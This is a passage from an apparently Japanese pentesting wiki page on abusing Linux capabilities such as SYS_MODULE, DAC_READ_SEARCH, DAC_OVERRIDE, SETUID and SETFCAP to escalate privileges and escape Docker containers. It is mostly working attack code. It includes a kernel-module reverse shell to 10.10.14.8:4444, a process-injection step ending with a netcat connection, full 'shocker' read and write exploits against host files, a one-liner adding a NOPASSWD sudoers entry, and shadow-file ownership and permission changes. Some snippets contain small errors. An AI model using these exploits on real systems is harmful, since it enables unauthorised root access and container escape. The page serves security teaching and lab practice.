Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
ホストで実行中のプロセスをリストアップする `ps -eaf`

1. アーキテクチャを取得する `uname -m`
2. アーキテクチャに対応したシェルコードを見つける ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. シェルコードをプロセスのメモリにインジェクトするためのプログラムを見つける ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. プログラム内のシェルコードを変更し、コンパイルする `gcc inject.c -o inject`
5. インジェクトしてシェルを取得する: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

[**CAP\_SYS\_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) はプロセスが任意のカーネルモジュールをロードおよびアンロードできるようにします (`init_module(2)`, `finit_module(2)` および `delete_module(2)` システムコール)。これにより、簡単な特権エスカレーションとリング-0の侵害が可能になります。カーネルは自由に変更でき、すべてのシステムセキュリティ、Linuxセキュリティモジュール、およびコンテナシステムが無効化されます。\
**つまり、ホストマシンのカーネルにカーネルモジュールを挿入/削除できます。**

**バイナリの例**

以下の例では、バイナリ **`python`** がこの機能を持っています。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
デフォルトでは、**`modprobe`**コマンドは依存関係リストとマップファイルをディレクトリ**`/lib/modules/$(uname -r)`**でチェックします。\
これを悪用するために、偽の**lib/modules**フォルダを作成しましょう。
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
次に、以下の2つの例からカーネルモジュールをコンパイルし、それをこのフォルダにコピーします。
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最後に、このカーネルモジュールをロードするために必要なPythonコードを実行します。
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**バイナリを使った例**

次の例では、バイナリ **`kmod`** がこの機能を持っています。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
これは、**`insmod`**コマンドを使用してカーネルモジュールを挿入することが可能であることを意味します。この特権を悪用して**逆シェル**を取得するための以下の例に従ってください。

**環境を使用した例（Dockerの脱出）**

Dockerコンテナ内で有効な機能を確認するには、次のコマンドを使用します：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力の中で、**SYS\_MODULE**の機能が有効になっていることがわかります。

逆シェルを実行する**カーネルモジュール**と、それを**コンパイル**するための**Makefile**を**作成**します：

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile内の各単語の前の空白文字は、**タブではなくスペース**である必要があります！
{% endhint %}

`make`を実行してコンパイルします。
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最後に、シェル内で`nc`を起動し、別のシェルから**モジュールをロード**して、ncプロセスでシェルをキャプチャすることができます。
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**この技術のコードは、[https://www.pentesteracademy.com/](https://www.pentesteracademy.com/)の「Abusing SYS\_MODULE Capability」の実験室からコピーされました。**

この技術の別の例は、[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)で見つけることができます。

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、プロセスが**ファイルの読み取り、ディレクトリの読み取りと実行権限をバイパス**することを可能にします。これは、ファイルの検索や読み取りに使用するために設計されていましたが、`open_by_handle_at(2)`を呼び出す権限も付与されます。`CAP_DAC_READ_SEARCH`の権限を持つ任意のプロセスは、`open_by_handle_at(2)`を使用して、マウント名前空間の外にあるファイルにアクセスできます。`open_by_handle_at(2)`に渡されるハンドルは、`name_to_handle_at(2)`を使用して取得される不透明な識別子であることが意図されています。ただし、このハンドルにはinode番号などの機密性の高い情報が含まれており、改ざんも可能です。これは、Sebastian KrahmerによってDockerコンテナで最初に問題が発生したことが示されました（[shocker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) exploit）。\
**つまり、ファイルの読み取り権限チェックとディレクトリの読み取り/実行権限チェックをバイパスすることができます。**

**バイナリを使用した例**

バイナリは任意のファイルを読み取ることができます。したがって、tarのようなファイルにこの機能がある場合、shadowファイルを読み取ることができます。
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**バイナリ2の例**

この場合、**`python`** バイナリにこの機能があると仮定しましょう。ルートファイルをリストするためには、次のようにします：
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
そして、ファイルを読むためには次のようにすることができます：
```python
print(open("/etc/shadow", "r").read())
```
**環境の例（Dockerの脱出）**

次のコマンドを使用して、Dockerコンテナ内で有効な機能を確認できます。
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力の中で、**DAC\_READ\_SEARCH**機能が有効になっていることがわかります。その結果、コンテナは**プロセスのデバッグ**ができます。

次の悪用方法については、[https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で学ぶことができますが、要約すると、**CAP\_DAC\_READ\_SEARCH**は許可チェックなしでファイルシステムをトラバースすることができるだけでなく、_**open\_by\_handle\_at(2)**_のチェックも明示的に削除し、**他のプロセスが開いている機密ファイルにアクセスすることができます**。

この権限を悪用してホストからファイルを読み取る元のエクスプロイトは、ここで見つけることができます: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)。以下は、**最初の引数で読み取りたいファイルを指定し、それをファイルにダンプする**ための修正版です。
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
エクスプロイトは、ホストにマウントされた何かのポインタを見つける必要があります。元のエクスプロイトでは、ファイル/.dockerinitを使用していましたが、この修正版では/etc/hostnameを使用しています。エクスプロイトが機能しない場合は、異なるファイルを設定する必要があるかもしれません。ホストにマウントされたファイルを見つけるには、mountコマンドを実行してください：
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**このテクニックのコードは、**[**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)**の「Abusing DAC\_READ\_SEARCH Capability」のラボからコピーされました**

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。技術的な知識を促進することを使命としているこの会議は、あらゆる分野の技術とサイバーセキュリティの専門家にとっての活気ある交流の場です。

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**これは、任意のファイルの書き込み許可チェックをバイパスできることを意味します。したがって、任意のファイルを書き込むことができます。**

特権を昇格させるために上書きできるファイルはたくさんあります。[**ここからアイデアを得ることができます**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**バイナリを使用した例**

この例では、vimにこの機能がありますので、_passwd_、_sudoers_、_shadow_などの任意のファイルを変更することができます。
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**バイナリ2の例**

この例では、**`python`** バイナリにこの機能が付与されます。Pythonを使用して、任意のファイルを上書きすることができます。
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**環境とCAP_DAC_READ_SEARCH（Docker脱出）の例**

次のコマンドを使用して、Dockerコンテナ内で有効な機能を確認できます。
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
まず、ホストの任意のファイルを読み取るために [**DAC\_READ\_SEARCH 機能を悪用する**](linux-capabilities.md#cap\_dac\_read\_search) 前のセクションを読んでください。そして、エクスプロイトを **コンパイル** してください。\
次に、ホストのファイルシステムに **任意のファイルを書き込むことができる** 以下のバージョンのショッカーエクスプロイトを **コンパイル** してください。
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Dockerコンテナから脱出するために、ホストから`/etc/shadow`と`/etc/passwd`のファイルを**ダウンロード**し、それらに**新しいユーザー**を**追加**して、**`shocker_write`**を使用して上書きします。その後、**ssh**を介して**アクセス**します。

**このテクニックのコードは、**[**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)**の「Abusing DAC\_OVERRIDE Capability」のラボからコピーされました。**

## CAP\_CHOWN

**これは、任意のファイルの所有者を変更できることを意味します。**

**バイナリの例**

`python`バイナリにこの機能があると仮定すると、**shadow**ファイルの**所有者**を**変更**し、**rootパスワード**を変更して特権を昇格させることができます。
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
または、**`ruby`** バイナリにこの機能がある場合:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**これは、任意のファイルのパーミッションを変更することができることを意味します。**

**バイナリの例**

もしPythonがこの機能を持っている場合、shadowファイルのパーミッションを変更し、**rootパスワードを変更**して特権を昇格させることができます。
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**これは、作成されたプロセスの有効なユーザーIDを設定することが可能であることを意味します。**

**バイナリを使用した例**

もしPythonがこの**機能**を持っている場合、特権をrootにエスカレーションするために非常に簡単に悪用することができます。
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**別の方法：**

This technique involves leveraging Linux capabilities to escalate privileges. Linux capabilities are a set of privileges that can be assigned to processes, allowing them to perform specific actions that would normally require root privileges. By exploiting misconfigurations or vulnerabilities in the system, an attacker can gain additional capabilities and elevate their privileges.

To identify processes with elevated capabilities, you can use the `getcap` command. This command lists the capabilities assigned to executable files. By analyzing the output, you can identify potential targets for privilege escalation.

To exploit this vulnerability, you can create a malicious executable file with the desired capabilities and replace a target executable with your file. When the target process is executed, it will inherit the elevated capabilities, allowing you to perform actions that would normally be restricted.

To prevent this type of privilege escalation, it is important to regularly review and restrict the capabilities assigned to processes. Additionally, ensure that executable files are only accessible to trusted users and regularly update the system to patch any vulnerabilities that could be exploited.
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**これは、作成されたプロセスの有効なグループIDを設定することが可能であることを意味します。**

特権をエスカレーションするために、上書きできる多くのファイルがあります。[ここからアイデアを得ることができます](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**バイナリの例**

この場合、任意のグループになりすますことができるため、グループが読み取ることができる興味深いファイルを探す必要があります。
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
一度特定のグループをなりすまして特権を昇格させるために、乱用できるファイルを見つけたら、次の手順でシェルを取得できます。
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
この場合、shadowグループがなりすまされているため、`/etc/shadow`ファイルを読むことができます。
```bash
cat /etc/shadow
```
もし**docker**がインストールされている場合、**dockerグループ**を**なりすまし**、それを悪用して[dockerソケットと特権の昇格](./#writable-docker-socket)を行うことができます。

## CAP\_SETFCAP

これは、ファイルとプロセスに対して機能を設定することが可能であることを意味します。

**バイナリを使用した例**

もしpythonがこの**機能**を持っている場合、簡単に特権を昇格させるために悪用することができます。

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% code %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
新しい機能をCAP\_SETFCAPでバイナリに設定すると、この機能が失われることに注意してください。
{% endhint %}

[SETUID機能](linux-capabilities.md#cap\_setuid)を持っている場合は、特権を昇格する方法を示すセクションに移動できます。

**環境を使用した例（Dockerの脱出）**

デフォルトでは、**Dockerのコンテナ内のプロセスにはCAP\_SETFCAP機能が与えられます**。次のようなことを行って確認できます：
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

apsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
この機能は、バイナリに他のどの機能でも与えることができるため、このページで言及されている他の機能の脱出を悪用してコンテナから脱出することができます。\
ただし、例えばgdbバイナリにCAP_SYS_ADMINとCAP_SYS_PTRACEの機能を与えようとすると、それらを与えることはできますが、その後バイナリは実行できなくなります。
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
調査の結果、次のようなことがわかりました：_Permitted: これはスレッドが仮定できる有効な機能の制限付きスーパーセットです。また、**CAP\_SETPCAP**機能を有効なセットに持たないスレッドによって継承セットに追加される可能性のある機能の制限付きスーパーセットでもあります。_\
Permitted機能は使用できる機能を制限するようです。\
ただし、Dockerはデフォルトで**CAP\_SETPCAP**も付与しているため、**継承可能な機能に新しい機能を設定する**ことができるかもしれません。\
ただし、この機能のドキュメントによると、_CAP\_SETPCAP: \[...\] 呼び出し元スレッドのバウンディングセットから継承セットに任意の機能を追加する_とあります。\
これによると、継承セットにはCAP\_SYS\_ADMINやCAP\_SYS\_PTRACEのような新しい機能を追加することはできないため、特権の昇格には使用できないようです。

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、`/dev/mem`、`/dev/kmem`、または`/proc/kcore`へのアクセス、`mmap_min_addr`の変更、`ioperm(2)`および`iopl(2)`システムコールへのアクセス、およびさまざまなディスクコマンドなど、いくつかの機密操作を提供します。この機能により、[過去に問題が発生した](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)こともあります。マニュアルページによれば、これによりホルダーは他のデバイス上でデバイス固有の操作を記述的に**実行することも可能**です。

これは**特権の昇格**や**Dockerの脱出**に役立つことがあります。

## CAP\_KILL

**これは任意のプロセスを終了することが可能であることを意味します。**

**バイナリの例**

`python`バイナリにこの機能があると仮定しましょう。もしもあなたが**いくつかのサービスやソケットの設定**（またはサービスに関連する任意の設定ファイル）を変更することができた場合、それをバックドアにすることができ、そのサービスに関連するプロセスを終了し、新しい設定ファイルがあなたのバックドアで実行されるのを待つことができます。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**killによる特権昇格**

もしkillの権限を持っており、**rootユーザーとして実行されている**（または別のユーザーとして実行されている）**nodeプログラム**がある場合、おそらく**シグナルSIGUSR1**を送信して、**nodeデバッガーを開く**ことができます。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
## CAP\_NET\_BIND\_SERVICE

これは、任意のポート（特権ポートでも）でリッスンすることができることを意味します。この機能では特権を直接エスカレーションすることはできません。

**バイナリの例**

もし**`python`**がこの機能を持っている場合、任意のポートでリッスンすることができ、他のポートに接続することもできます（一部のサービスは特定の特権ポートからの接続を要求します）。

{% tabs %}
{% tab title="リッスン" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% tab title="接続" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、プロセスが利用可能なネットワーク名前空間で**RAWおよびPACKETソケットタイプを作成**できるようにします。これにより、公開されたネットワークインターフェースを介して任意のパケットの生成と送信が可能になります。多くの場合、このインターフェースは仮想イーサネットデバイスであり、悪意のあるまたは**侵害されたコンテナ**がさまざまなネットワークレイヤーで**パケットを偽装**することができます。この能力を持つ悪意のあるプロセスまたは侵害されたコンテナは、ファイアウォールがパケットの種類と内容を制限するための対策がない場合、上流ブリッジに注入したり、コンテナ間のルーティングを悪用したり、ネットワークアクセス制御をバイパスしたり、ホストネットワーキングを改ざんしたりすることができます。最後に、この能力により、プロセスは利用可能な名前空間内の任意のアドレスにバインドすることができます。この能力は、pingがコンテナ内からICMPリクエストを作成するためにRAWソケットを使用するため、特権コンテナによってしばしば保持されます。

**これはトラフィックを嗅覚することが可能であることを意味します。**この能力を直接使用して特権を昇格することはできません。

**バイナリの例**

バイナリ**`tcpdump`**がこの能力を持っている場合、ネットワーク情報をキャプチャするために使用することができます。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
注意してください、もし**環境**がこの機能を提供している場合、**`tcpdump`**を使用してトラフィックをスニフィングすることもできます。

**バイナリ2の例**

以下の例は、"**lo**"（**localhost**）インターフェースのトラフィックを傍受するのに役立つ**`python2`**コードです。このコードは、[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)のラボ「_The Basics: CAP-NET\_BIND + NET\_RAW_」から取得しました。
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
